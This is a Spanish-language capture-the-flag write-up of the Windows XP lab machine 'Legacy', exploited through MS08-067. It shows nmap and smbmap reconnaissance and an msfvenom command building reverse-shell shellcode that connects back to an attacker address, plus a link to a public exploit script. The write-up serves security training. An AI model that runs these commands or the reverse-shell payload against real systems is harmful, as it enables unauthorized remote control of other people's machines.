---
title: Legacy
published: true
categories: [Windows, Easy] 
tags: [Windows explotation, MS08-067]
author: Kripteria
image:
  path: https://user-images.githubusercontent.com/55555187/182439413-1283bf8a-321b-49c1-90a3-43ce6f8f3e09.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

Legacy es una <font color="#98E256">máquina Easy</font> de temática <font color="#2874A6">Windows</font> en la que se toca la vulnerabilidad MS08-067 sobre RPC.

## Reconocimiento y explotación

```bash
nmap -p- --open -sS --min-rate 10000 -Pn -n -vvv -oG portScan 10.10.10.4
```

![2022-07-30-12-02-31-image](https://user-images.githubusercontent.com/55555187/182439389-a6e5097b-2b3a-4ef9-a835-d83fa674e054.png)

```bash
nmap -sVC -p135,139,445 10.10.10.4 -oN portSV
```

![2022-07-30-12-04-05-image](https://user-images.githubusercontent.com/55555187/182439378-f3aece5b-a153-4c20-89b0-47fb0f87956e.png)

Reviso el servicio Samba pero no tiene ningún recurso compartido.

```bash
smbmap -H 10.10.10.4 -R
```

Viendo la información reportada por *nmap* me llama la atención el OS (*Windows XP*) y el puerto *RPC* abierto por lo que decido buscar exploits relacionados con ese OS y puerto.

Tras un rato de investigación descubro que en Windpows XP se puede lograr RCE explotando la vulnerabilidad **MS08_067** en RPC que explota un *buffer overflow*.

Buscando en Github encuentro un script en Python que se puede utilizar para explotar la vulnerabilidad [MS08-067.py](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py). Lo único que hay que hacer es modificar el shellcode del script por uno propio.

Genero un shellcode utilizando *msfvenom* que me entable una revershe shell y la sustituyo en el script

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

Ejecuto el script y logro una shell:

![2022-07-30-12-37-36-image](https://user-images.githubusercontent.com/55555187/182439397-b0732336-8f6e-4a26-8c0d-e0b2023dd014.png)

![2022-07-30-12-38-10-image](https://user-images.githubusercontent.com/55555187/182439392-76759255-4a06-4cb3-bc6a-3a84782f7a97.png)

**Nota:** Si falla el intento de explotación se puede dar un bloqueo en Svchost.exe lo que haría que el servicio Samba fallase impidiendo (impidiendo explotar la vulnerabilidad, entre otras cosas) por lo que hay que tener cuidado a la hora de ejecutar el exploit.

Intento ver con que usuario tengo la shell: 

1. Comprobando la variable de entorno *USERNAME* mediante *echo %USERNAME%* pero no obtengo nada por que no está seteada

2. Intentando usar *whoami* pero en Windows XP no existe

3. Usando el comando *net* para ver que usuarios existen en el sistema por si solo hubiese uno (poco probable)

4. Mirando si puedo lanzar una *powershell* para probar con el comando *[System.Security.Principal.WindowsIdentity]::GetCurrent().Name* pero no está powershell en el sistema

A pesar de que no he podido obtener información del usuario, puedo acceder al escritorio de Administrator por lo que es sensato asumir que estoy como dicho usuario.

## Escalada de privilegios

En este caso no es necesario ya que tenemos una shell como **Administrator**
